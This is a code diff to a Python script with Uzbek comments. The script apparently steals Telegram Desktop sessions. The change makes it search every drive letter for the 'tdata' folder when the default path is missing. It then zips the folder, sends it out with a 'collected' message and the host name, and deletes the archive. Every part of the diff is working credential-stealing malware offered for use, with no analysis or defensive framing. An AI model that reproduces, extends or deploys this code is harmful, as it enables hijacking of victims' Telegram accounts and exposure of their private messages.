@@ -48,27 +48,40 @@ def get_tdata():
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
     if os.path.exists(tdata_path):
-        try:
-            temp_dir = tempfile.gettempdir()
-            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
-            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for root, dirs, files in os.walk(tdata_path):
-                    for file in files:
-                        try:
-                            file_path = os.path.join(root, file)
-                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
-                        except: pass
-            return zip_path
-        except:
-            return None
-    return None
+        return tdata_path, pc_name
+
+    # Agar standart yo'l topilmasa, hamma disk va papkalarni qidiramiz
+    for drive_letter in range(ord('C'), ord('Z') + 1):
+        drive = f"{chr(drive_letter)}:\\"
+        if os.path.exists(drive):
+            try:
+                for root, dirs, files in os.walk(drive, topdown=True):
+                    if os.path.basename(root).lower() == 'tdata':
+                        return root, pc_name
+                    if 'telegramdesktop' in root.lower():
+                        possible_tdata = os.path.join(root, 'tdata')
+                        if os.path.exists(possible_tdata):
+                            return possible_tdata, pc_name
+            except:
+                pass
+    return None, pc_name
 
 # MAIN
-tdata_path = get_tdata()
+tdata_path, pc_name = get_tdata()
 if tdata_path:
-    send_file(tdata_path, f"⚡ Pico birinchi tdata yubordi!\n🖥 {socket.gethostname()}")
-    os.remove(tdata_path)
-
-# Agar Telegram Desktop ochiq bo'lmasa, yuborish uchun uni ochishga harakat qiling
-if not tdata_path:
-    send_message(f"⚠️ tdata topilmadi!\n🖥 {socket.gethostname()}")
+    try:
+        temp_dir = tempfile.gettempdir()
+        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(tdata_path):
+                for file in files:
+                    try:
+                        file_path = os.path.join(root, file)
+                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                    except: pass
+        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+        os.remove(zip_path)
+    except:
+        pass
+else:
+    send_message(f"⚠️ tdata topilmadi!\n🖥 {pc_name}")
